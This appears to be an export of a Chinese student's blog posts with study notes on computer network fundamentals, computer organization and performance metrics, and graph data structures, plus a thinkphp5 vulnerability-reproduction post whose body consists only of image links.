<p>计算机网络：是一个将分散的、具有独立功能的计算机系统，通过通信设备与线路连接起来，由功能完善的软件实现资源共享和信息传递的系统</p>
<p>计算机网络是互连的、自洽的计算机集合<br>互连-通过通信链路互联互通<br>自洽-无主从关系 </p>
<h2 id="计算机网络的功能"><a href="#计算机网络的功能" class="headerlink" title="计算机网络的功能"></a>计算机网络的功能</h2><p>1.数据通信</p>
<p>2.资源共享</p>
<p>3.分布式处理</p>
<p>4.提高可靠性</p>
<p>5.负载均衡</p>
<h3 id="计算机网络的发展"><a href="#计算机网络的发展" class="headerlink" title="计算机网络的发展"></a>计算机网络的发展</h3><h4 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h4><p>ARPAnet 阿帕网<br><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221230194927197-16727929461652.png" alt="image-20221230194927197"></p>
<p> 1983年阿帕网接受TCP/IP选定Internet为主要的计算机通信网络，成立了Internet因特网</p>
<h4 id="第二阶段——三级结构"><a href="#第二阶段——三级结构" class="headerlink" title="第二阶段——三级结构"></a>第二阶段——三级结构</h4><p>1985年，NSF围绕6个大型计算机中心建设计算机网络，即国家科学基金网NSFNET<img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221230195323201-16724012038611-16727929473853.png" alt="image-20221230195323201"></p>
<h4 id="第三阶段——多层次ISP结构"><a href="#第三阶段——多层次ISP结构" class="headerlink" title="第三阶段——多层次ISP结构"></a>第三阶段——多层次ISP结构</h4><p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221230195548440-16727929491234.png" alt="image-20221230195548440"></p>
<p>IXP：因特网交换点——大大提高了信息传递和信息共享的速度</p>
<h2 id="计算机网络的组成"><a href="#计算机网络的组成" class="headerlink" title="计算机网络的组成"></a>计算机网络的组成</h2><p>1.组成部分：硬件、软件、协议<br><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231090329144-16727929510445.png" alt="image-20221231090329144"></p>
<p>2.工作方式</p>
<p>端和端之间的通信是进程之间的交流</p>
<p>边缘部分：用户直接使用<br>————C/S方式(Client/Server)，eg：微信<br>————B/S方式(Brower/Server)<br>————P2P方式(peer-to-peer)， eg：种子下载</p>
<p>核心部分：为边缘部分服务</p>
<p>3.功能组成<br>——通信子网：实现数据通信<br>——资源子网：实现资源共享/数据处理</p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231091641824-16727929530996.png" alt="image-20221231091641824"></p>
<h2 id="计算机网络的分类"><a href="#计算机网络的分类" class="headerlink" title="计算机网络的分类"></a>计算机网络的分类</h2><p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231091904682-16727929549897.png" alt="image-20221231091904682"></p>
<p>广域网使用交换技术，局域网使用广播技术</p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231092226561-16727929560428.png" alt="image-20221231092226561"></p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231092249995-16727929573559.png" alt="image-20221231092249995"><br>电路交换：电话<br>报文交换、分组交换：使用存储转发</p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231092654347-167279295892210.png" alt="image-20221231092654347"></p>
<p>网状型常用于广域网</p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231092847098-167279296069711.png" alt="image-20221231092847098"></p>
<h2 id="标准化工作及相关组织"><a href="#标准化工作及相关组织" class="headerlink" title="标准化工作及相关组织"></a>标准化工作及相关组织</h2><p>标准化对计算机网络至关重要</p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231093324559-167279296217912.png" alt="image-20221231093324559"></p>
<p>标准分类：<br>——法定标准：由权威机构制定的正式的合法的标————OSI<br>——事实标准：某些公司的产品在竞争中占据了主流，逐渐这些产品的协议和技术成为了标准————TCP/IP</p>
<h3 id="RFC-Request-For-Comments-————因特网标准的形式"><a href="#RFC-Request-For-Comments-————因特网标准的形式" class="headerlink" title="RFC(Request For Comments)————因特网标准的形式"></a>RFC(Request For Comments)————因特网标准的形式</h3><p>RFC要上升为因特网正式标准的四个阶段：<br>        1）因特网草案：这个阶段还不是RFC文档<br>        2）建议标准：从这个阶段开始成为RFC文档<br>        3）草案标准：递交IETF\IAB审核（已取消）<br>        4）因特网标准</p>
<h3 id="标准化工作的相关组织"><a href="#标准化工作的相关组织" class="headerlink" title="标准化工作的相关组织"></a>标准化工作的相关组织</h3><p>国际标准化组织ISO：OSI模型、HDLC协议<br>国际电信联盟ITU：制定通信规则<br>电气和电子工程师协会IEEE：学术机构、IEEE802系列标准、5G<br>Internet工程任务组IETF：负责因特网相关标准的制定</p>
]]></content>
      <categories>
        <category>计网</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp5漏洞复刻</title>
    <url>/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>s对于thinkphp5经典漏洞的复现</p>
<span id="more"></span>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\1.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\2.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\3.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\4.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\5.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\6.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\7.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\8.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\9.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\10.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\11.png" alt></p>
]]></content>
      <tags>
        <tag>网络攻防</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/12/26/%E6%95%B0%E8%AE%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="导论"><a href="#导论" class="headerlink" title="导论"></a>导论</h1><h2 id="数论"><a href="#数论" class="headerlink" title="数论"></a>数论</h2><p>自然数：正整数（0没有统一标准）</p>
]]></content>
  </entry>
  <entry>
    <title>计算机系统的多级层次结构及性能指标</title>
    <url>/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>机器语言发展史和评价性能指标</p>
<span id="more"></span>
<h2 id="计算机系统的多级层次结构"><a href="#计算机系统的多级层次结构" class="headerlink" title="计算机系统的多级层次结构"></a>计算机系统的多级层次结构</h2><p>传统机器（用机器语言的机器）：执行二进制机器指令<br>微程序机器（微指令系统）：由硬件直接执行微指令<br>虚拟机器（汇编语言机器）：用汇编程序翻译成机器语言<br>虚拟机器（高级语言机器）：用编译程序翻译成汇编语言程序</p>
<p><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20220905150539173.png" alt="image-20220905150539173"><br>下层是上层的基础，上层是下层的扩展</p>
<p><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20220905151514376.png" alt="image-20220905151514376"></p>
<p>计算机组成原理的“透明”指的是看不见</p>
<h2 id="计算机的性能指标"><a href="#计算机的性能指标" class="headerlink" title="计算机的性能指标"></a>计算机的性能指标</h2><h3 id="存储器的性能指标"><a href="#存储器的性能指标" class="headerlink" title="存储器的性能指标"></a>存储器的性能指标</h3><p><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20220905151938563.png" alt="image-20220905151938563"></p>
<h3 id="CPU的性能指标"><a href="#CPU的性能指标" class="headerlink" title="CPU的性能指标"></a>CPU的性能指标</h3><p>CPU主频：CPU内数字脉冲信号震荡的频率<br>CPU时钟周期：单位：微秒、纳秒<br>CPU主频（时钟频率）=$\frac{1}{CPU时钟周期}$，单位是赫兹Hz，主频越高，CPU越快<br>CPI：执行一条指令所需的时钟周期数（不同的指令，CPI不同。甚至相同的指令，CPI也可能有变化）<br>执行一条指令的耗时=CPI*CPU时钟周期</p>
<p><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20220905153247868.png" alt="image-20220905153247868"></p>
<p>IPS：每秒执行多少条指令  IPS=$\frac{主频}{平均CPI}$，单位：KIPS、MIPS<br>FLOPS：每秒执行多少次浮点运算，单位：KFLOPS、MFLOPS、GFLOPS、TFLOPS</p>
<h3 id="系统整体的性能指标"><a href="#系统整体的性能指标" class="headerlink" title="系统整体的性能指标"></a>系统整体的性能指标</h3><p>数据通路带宽：数据总线一次所能并行传送信息的位数（各硬件部件通过数据总线传输数据）<br>吞吐量：指系统在单位时间内处理请求的数量<br>响应时间：指从用户向计算机发送一个请求到系统对该请求做出响应并获得他所需要的结果的等待时间</p>
<p>基准程序：跑分软件</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20220905154407701.png" alt><br><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/1.png" alt><img src="/2022/08/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A4%9A%E7%BA%A7%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%8A%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20220905154620242.png" alt></p>
]]></content>
      <tags>
        <tag>计算机组成</tag>
      </tags>
  </entry>
  <entry>
    <title>图的表示方法</title>
    <url>/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>邻接矩阵法、十字链表法、邻接表法、邻接多重表的定义以及代码实现的学习以及其之间的比较</p>
<span id="more"></span>
<h2 id="邻接矩阵法"><a href="#邻接矩阵法" class="headerlink" title="邻接矩阵法"></a>邻接矩阵法</h2><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806130207218.png" alt="image-20220806130207218"><br>有向图：出度为行中1的个数  入度为列中1的个数 。矩阵是行-&gt;列</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxVertexNum 100                      <span class="comment">//顶点数目最大值</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span> </span><br><span class="line">    <span class="type">char</span> Vex[MaxVertexNum];                   <span class="comment">//顶点表</span></span><br><span class="line">    <span class="type">int</span> Edge[MaxVertexNum][MaxVertexNum];     <span class="comment">//邻接矩阵、边表  //因为数据为0，1，可以换为bool型</span></span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;                        <span class="comment">//图当前的顶点数和边数/弧数</span></span><br><span class="line">&#125; MGraph</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806130727614.png" alt="image-20220806130727614"></p>
<p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806131031260.png" alt="image-20220806131031260"><br>使用宏定义常量表示无穷   #define INFINITY</p>
<h3 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h3><script type="math/tex; mode=display">
在n个顶点的图中，空间复杂度为O(n)+O(n^2)=O(|v|^2),|v|为顶点集的个数\\
所以空间复杂度与边数没有关系，更适合用于存储稠密图，因为无向图的邻接矩阵是对称矩阵，所以可以压缩为上三角矩阵进行存储</script><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806131810061.png" alt="image-20220806131810061"></p>
<h2 id="邻接表法"><a href="#邻接表法" class="headerlink" title="邻接表法"></a>邻接表法</h2><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806134053572.png" alt="image-20220806134053572"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//邻接表存储的图（顺序存储） </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    AdjList vertices;</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125; ALGraph;</span><br><span class="line"><span class="comment">//顶点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VNode</span>&#123;</span></span><br><span class="line">	VertexType data;               <span class="comment">//顶点信息</span></span><br><span class="line">    ArcNode *first;                <span class="comment">//第一条边</span></span><br><span class="line">&#125;VNode,AdjList[MaxVertexNum];</span><br><span class="line"><span class="comment">//边</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> adjvex;                    <span class="comment">//边指向的结点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> *<span class="title">next</span>;</span>           <span class="comment">//指向下一条边的指针</span></span><br><span class="line">    <span class="comment">//InfoType info;                //边权值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无向图边结点数量是2|E|，整体空间复杂度为O(|V|+2|E|)<br>有向图边结点数量是|E|，整体空间复杂度为O(|V|+|E|)<br>邻接表存储稀疏图<br>出度：遍历目标结点的链表<br>入度：遍历整个链表寻找指向目标结点的个数</p>
<h2 id="十字链表、邻接多重表"><a href="#十字链表、邻接多重表" class="headerlink" title="十字链表、邻接多重表"></a>十字链表、邻接多重表</h2><p>十字链表用于存储有向图<br>邻接多重表存储无向图</p>
<h3 id="十字链表"><a href="#十字链表" class="headerlink" title="十字链表"></a>十字链表<img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806140152515.png" alt="image-20220806140152515"></h3><h3 id="邻接多重表"><a href="#邻接多重表" class="headerlink" title="邻接多重表"></a>邻接多重表</h3><p>邻接表存储无向图：每条边对于两份冗余数据，删除，删除顶点、边不方便<br><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806140736457.png" alt="image-20220806140736457"><br><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806140750826.png" alt="image-20220806140750826"><br>空间复杂度：O(|V|+|E|)</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806141213425.png" alt="image-20220806141213425"></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title>硬件及工作过程</title>
    <url>/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>初步了解硬件以及工作原理</p>
<span id="more"></span>
<h2 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h2><h3 id="主存储器"><a href="#主存储器" class="headerlink" title="主存储器"></a>主存储器</h3><p><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905091641009.png" alt><br>数据在存储体内按地址存储，存储体由一个个存储单元构成<br>存储单元：每个存储单元存放一串二进制代码，每个地址对于一个存储单元<br>存储字(word)：存储单元中二进制代码的组合<br>存储字长：存储单元中二进制代码的位数<br>存储元：即存储二进制的电子元件，每个存储元可存1bit（通过电容实现)<br>MAR位数反映存储单元的个数——MAR=4位：总共有2^4^个存储单元<br>MDR位数=存储字长——MDR=16位：每个存储单元可存放16bit，一个字(word)=16bit<br>注意：一个字节(Byte)=8bit，1B=一个字节，1b=1bit<br>100Mbps约等于10MB/s</p>
<h3 id="运算器"><a href="#运算器" class="headerlink" title="运算器"></a>运算器</h3><p><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905092645725.png" alt></p>
<h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><p><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905092949667.png" alt></p>
<p><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905093207919.png" alt></p>
<h3 id="计算机的工作过程"><a href="#计算机的工作过程" class="headerlink" title="计算机的工作过程"></a>计算机的工作过程</h3><p><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905093247087.png" style="zoom:80%;"><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905093330885-16633217362011.png" alt><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905094001033.png" alt><br>000001：取数指令<br>000010：存数指令<br>000011：加法指令<br>000100：乘法指令<br>000110：停机</p>
<p><img src="/2022/08/23/%E7%A1%AC%E4%BB%B6%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%B7%A5%E7%A8%8B/image-20220905095420225.png" alt></p>
]]></content>
      <tags>
        <tag>计算机组成</tag>
      </tags>
  </entry>
  <entry>
    <title>图的基本操作</title>
    <url>/2022/08/22/%E5%9B%BE%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>图的几个基本操作函数总结</p>
<span id="more"></span>
<h2 id="图的基本操作"><a href="#图的基本操作" class="headerlink" title="图的基本操作"></a>图的基本操作</h2><h3 id="Adjacent-G-x-y"><a href="#Adjacent-G-x-y" class="headerlink" title="Adjacent(G,x,y)"></a>Adjacent(G,x,y)</h3><p>判断图G是否存在边<x,y>(x,y)<br>该操作邻接矩阵更合适</x,y></p>
<h3 id="Neighbors-G-x"><a href="#Neighbors-G-x" class="headerlink" title="Neighbors(G,x)"></a>Neighbors(G,x)</h3><p>列出图G与结点x邻接的边<br>该操作一般情况下邻接矩阵更合适</p>
<h3 id="InsertVertex-G-x"><a href="#InsertVertex-G-x" class="headerlink" title="InsertVertex(G,x)"></a>InsertVertex(G,x)</h3><p>在图G中插入顶点x<br>在邻接矩阵和邻接表中都是在最后插入新的数据</p>
<h3 id="DeleteVertex-G-x"><a href="#DeleteVertex-G-x" class="headerlink" title="DeleteVertex(G,x)"></a>DeleteVertex(G,x)</h3><p>从图G中删除顶点x<br>邻接矩阵：删除一个顶点之后，将对应的行和列重置为0，可以设置一个bool变量表示是一个空结点</p>
<h3 id="AddEdge-G-x-y"><a href="#AddEdge-G-x-y" class="headerlink" title="AddEdge(G,x,y)"></a>AddEdge(G,x,y)</h3><p>若无向边（x,y)或者有向边<x,y>不存在，则向图G中添加该边<br>邻接表可以使用头插法，时间复杂度为O(1)</x,y></p>
<h3 id="FirstNeighbor-G-x"><a href="#FirstNeighbor-G-x" class="headerlink" title="FirstNeighbor(G,x)"></a>FirstNeighbor(G,x)</h3><p>求图G中顶点x的第一个邻接点，若有则返回顶点号，没有返回-1</p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title>图</title>
    <url>/2022/08/22/%E5%9B%BE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>有向图无向图简单图多重图连通图强连通图子图的定义，以及图中顶点的度连通分量，边的权和图与树森林的关系和转化，特殊形态的图的学习</p>
<span id="more"></span>
<h2 id="图的基本概念"><a href="#图的基本概念" class="headerlink" title="图的基本概念"></a>图的基本概念</h2><h3 id="图的定义"><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803205115991.png" alt><br>图的边集可以为空集，边集可以有方向也可以没方向</p>
<p><strong>图逻辑结构的应用</strong><br>微信好友关系     地铁站（顶点集）铁路</p>
<h3 id="无向图，有向图"><a href="#无向图，有向图" class="headerlink" title="无向图，有向图"></a>无向图，有向图</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803205427477.png" alt><br>无向图边集用（)  有向图边集用&lt;&gt;</p>
<h3 id="简单图、多重图"><a href="#简单图、多重图" class="headerlink" title="简单图、多重图"></a>简单图、多重图</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803205904593.png" alt></p>
<h3 id="顶点的度、入度、出度"><a href="#顶点的度、入度、出度" class="headerlink" title="顶点的度、入度、出度"></a>顶点的度、入度、出度</h3><p>无向图：<strong>顶点v的度</strong>是该顶点边的条数，记为TD(v)<br>有向图：<strong>顶点v的入度</strong>是以顶点v为终点的有向边的数目，记为ID(v)<br>              <strong>顶点v的出度</strong>是以顶点v为起点的有向边的数目，记为OD(v)<br>              <strong>顶点v的度</strong>等于入度和出度的和，即TD(v)=ID(v)+OD(v)</p>
<script type="math/tex; mode=display">
n个顶点，e条边\\无向图：\sum_{i=1}^{n}TD(v_i)=2e\\有向图：\sum_{i=1}^nID(v_i)=\sum_{i=1}^nOD(v_i)=e</script><h3 id="顶点-顶点的关系描述"><a href="#顶点-顶点的关系描述" class="headerlink" title="顶点-顶点的关系描述"></a>顶点-顶点的关系描述</h3><p>路径——顶点A到顶点E之间的一条路径是指顶点序列（A,B,C,D,E)<br>回路—— 第一个顶点和最后一个顶点相同的路径称为<strong>回路或者环</strong><br>简单路径——路径序列中顶点不重复出现的路径<br>简单回路——除第一个顶点和最后一个顶点外，其余顶点不重复出现<br>路径长度——路径上边的数目<br>点到点的距离——最短路径的长度（若不存在路径记为无穷）<br>无向图中，若从顶点v到顶点w有路径存在，则成v和w是连通的<br>有向图中，若从顶点v到顶点w和从顶点w到顶点v之间都有路径，则称这两个顶点是强连通的</p>
<h3 id="连通图、强连通图"><a href="#连通图、强连通图" class="headerlink" title="连通图、强连通图"></a>连通图、强连通图</h3><p>无向图：若图G任意两个顶点都是连通的，则称图G为连通图，否则为非连通图<br>有向图：若图G任何一对顶点都是强连通的，则称此图为强连通图</p>
<script type="math/tex; mode=display">
常见考点：对于n个顶点的无向图G，若G是连通图，则最少有n-1条边。\\若G是非连通图，则最多可能有C_{n-1}^2条边\\对于有n个顶点的有向图G，若G是强连通图，则最少有n条边（形成回路）</script><h3 id="子图"><a href="#子图" class="headerlink" title="子图"></a>子图</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803223621217.png" alt></p>
<h3 id="连通分量"><a href="#连通分量" class="headerlink" title="连通分量"></a>连通分量</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803223755599.png" alt><br><img src="/2022/08/22/%E5%9B%BE/image-20220803223815794.png" alt><br><img src="/2022/08/22/%E5%9B%BE/image-20220803223952245.png" alt></p>
<h3 id="生成树、森林"><a href="#生成树、森林" class="headerlink" title="生成树、森林"></a>生成树、森林</h3><p>连通图的生成树是包含图中全部顶点的一个极小连通子图<br><img src="/2022/08/22/%E5%9B%BE/image-20220803224238846.png" alt><br>n个顶点应该有n-1条边<br>在非连通图中，连通分量的生成树构成了非连通图的生成森林<br><img src="/2022/08/22/%E5%9B%BE/image-20220803224538347.png" alt></p>
<h3 id="边的权、带权图-网"><a href="#边的权、带权图-网" class="headerlink" title="边的权、带权图/网"></a>边的权、带权图/网</h3><p>边的权：每条边都可以标上具用某种含义的数值，该数值称为该边的<strong>权值</strong>。<br>带权图/网：边上带有权值的图称为<strong>带权图</strong>，也称<strong>网</strong><br>带权路径长度：当图是带权图时，一条<strong>路径上所有边的权值之和</strong></p>
